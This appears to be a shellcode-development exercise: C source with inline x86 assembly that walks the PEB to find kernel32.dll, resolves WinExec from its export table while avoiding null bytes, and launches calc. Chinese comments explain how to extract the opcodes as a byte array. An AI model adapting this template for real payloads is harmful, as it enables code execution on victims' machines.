/*
====正则表达式====
不要忘了正则表达式两侧的空格

1. 反汇编中去除代码和注释
将
====^[\t ]+.*$====
替换为空

2. 去除空行
将
====^\s*\n====
替换为空

3. 按住Alt删除前边和后边

4. 去除末尾空白
将
====\s*$====
替换为空

5. 增加前导空格
将
====(^[0-9A-F])====
替换为
==== ($1)====

6. 增加逗号
将
==== ([0-9A-F])====
替换为
====, 0x($1)====
*/

void f() {
	__asm {
		; Save all registers
		push        eax
		push        ebx
		push        ecx
		push        edx
		push        esi
		push        edi

		; Establish a new stack frame
		push        ebp
		mov         ebp, esp
		sub         esp, 18h; Allocate memory on stack for local variables

		; push the function name on the stack
		xor         esi, esi
		push        esi; null termination
		push        63h
		mov ax, 6578h
		push ax
		; push word   6578h; I do not know how to push word in asm in visual studio
		; both push word and pushw do not work
		; so I used mov ax and push ax
		push        456E6957h
		mov         dword ptr[ebp - 4], esp; var4 = "WinExec\x00"

		; Find kernel32.dll base address
		xor         esi, esi; esi = 0
		mov         ebx, dword ptr fs : [esi + 30h]; written this way to avoid null bytes
		mov         ebx, dword ptr[ebx + 0Ch]
		mov         ebx, dword ptr[ebx + 14h]
		mov         ebx, dword ptr[ebx]
		mov         ebx, dword ptr[ebx]
		mov         ebx, dword ptr[ebx + 10h]; ebx holds kernel32.dll base address
		mov         dword ptr[ebp - 8], ebx; var8 = kernel32.dll base address

		; Find WinExec address
		xor         eax, eax
		mov         eax, dword ptr[ebx + 3Ch]
		add         eax, ebx
		mov         eax, dword ptr[eax + 78h]
		add         eax, ebx
		mov         ecx, dword ptr[eax + 24h]
		add         ecx, ebx
		mov         dword ptr[ebp - 0Ch], ecx
		mov         edi, dword ptr[eax + 20h]
		add         edi, ebx
		mov         dword ptr[ebp - 10h], edi
		mov         edx, dword ptr[eax + 1Ch]
		add         edx, ebx
		mov         dword ptr[ebp - 14h], edx
		mov         ebx, dword ptr[eax + 14h]; Number of exported functions

		; counter = 0
		xor eax, eax

		loopFind :
		mov         edx, dword ptr[ebp - 8]
			mov         edi, dword ptr[ebp - 10h]
			mov         esi, dword ptr[ebp - 4]
			xor ecx, ecx
			cld
			mov         edi, dword ptr[edi + eax * 4]
			add         edi, edx
			add         cx, 8
			repe cmps   byte ptr[esi], byte ptr es : [edi]
			je          found
			inc         eax; counter++
			cmp         eax, ebx; check if last function is reached
			jb          loopFind; if not the last->loopFind
			add         esp, 26h
			jmp         end; if function is not found, jump to end

			found :
		; the counter(eax) now holds the position of WinExec
			mov         ecx, dword ptr[ebp - 0Ch]
			mov         ebx, edx
			mov         edx, dword ptr[ebp - 14h]
			mov         ax, word ptr[ecx + eax * 2]
			mov         eax, dword ptr[edx + eax * 4]
			add         eax, ebx; eax = address of WinExec =
			; = kernel32.dll base address + RVA of WinExec
			xor         edx, edx
			push        edx; null termination



			; push        6578652Eh; exe.
			; push        636C6163h; clac
			; push        5C32336Dh; \23m
			; push        65747379h; etsy
			; push        535C7377h; S\sw
			; push        6F646E69h; odni
			; push        575C3A43h; W\:C
			push 636C6163h


			mov         esi, esp; esi -> "C:\Windows\System32\calc.exe"
			push        0Ah
			push        esi
			call        eax

			; add         esp, 46h
			add         esp, 2Eh; 0x18 = 24(DEC) = 4 * 6 0x46 - 0x18 = 0x2E

			end :
		pop         ebp; restore all registers and exit
			pop         edi
			pop         esi
			pop         edx
			pop         ecx
			pop         ebx
			pop         eax
			; ret
			; ret = 0xC3
	}
}
int main() {
	f();
}
